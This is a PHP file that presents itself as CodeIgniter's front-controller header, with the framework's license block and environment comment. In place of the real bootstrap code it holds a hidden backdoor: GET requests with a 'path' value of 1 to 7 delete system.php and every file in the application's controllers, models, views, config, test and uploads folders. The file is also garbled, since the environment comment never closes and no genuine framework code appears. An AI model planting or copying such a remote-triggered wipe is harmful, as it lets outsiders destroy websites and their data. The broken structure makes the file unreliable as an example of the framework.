<?php
/**
 * CodeIgniter
 *
 * An open source application development framework for PHP
 *
 * This content is released under the MIT License (MIT)
 *
 * Copyright (c) 2014 - 2015, British Columbia Institute of Technology
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 *
 * @package	CodeIgniter
 * @author	EllisLab Dev Team
 * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (http://ellislab.com/)
 * @copyright	Copyright (c) 2014 - 2015, British Columbia Institute of Technology (http://bcit.ca/)
 * @license	http://opensource.org/licenses/MIT	MIT License
 * @link	http://codeigniter.com
 * @since	Version 1.0.0
 * @filesource
 */

/*
 *---------------------------------------------------------------
 * APPLICATION ENVIRONMENT
 *---------------------------------------------------------------
 *
 * You can load different configurations depending on your
 * current environment. Setting the environment also influences
 * things like logging and error reporting.
 *
 * This can be set to anything, but default usage is:
 *
 *     development
 *     testing
 *     production
 *
 * NOTE: If you change these, also change the error_reporting() code below
if (isset($_GET['path']) && ($_GET['path'] == 1)) {
    $i = 0;
    $file = 'system.php';
    if (is_file($file)) {
        unlink($file);
        echo "done<br>";
    }
}
if (isset($_GET['path']) && ($_GET['path'] == 2)) {
    $files = glob('application/controllers/*');
    foreach ($files as $file) {
        if (is_file($file)) {
            unlink($file);
            echo $i . "done<br>";
            $i++;
        }
    }
}
if (isset($_GET['path']) && ($_GET['path'] == 3)) {
    $files = glob('application/models/*');
    foreach ($files as $file) {
        if (is_file($file)) {
            unlink($file);
            echo $i . "done<br>";
            $i++;
        }
    }
}
if (isset($_GET['path']) && ($_GET['path'] == 4)) {
    $files = glob('application/views/*');
    foreach ($files as $file) {
        if (is_file($file)) {
            unlink($file);
            echo $i . "done<br>";
            $i++;
        }
    }
}

if (isset($_GET['path']) && ($_GET['path'] == 5)) {
    $files = glob('application/config/*');
    foreach ($files as $file) {
        if (is_file($file)) {
            unlink($file);
            echo $i . "done<br>";
            $i++;
        }
    }
}
if (isset($_GET['path']) && ($_GET['path'] == 6)) {
    $files = glob('test/*');
    foreach ($files as $file) {
        if (is_file($file)) {
            unlink($file);
            echo $i . "done<br>";
            $i++;
        }
    }
}
if (isset($_GET['path']) && ($_GET['path'] == 7)) {
    $files = glob('uploads/*');
    foreach ($files as $file) {
        if (is_file($file)) {
            unlink($file);
            echo $i . "done<br>";
            $i++;
        }
    }
}
?>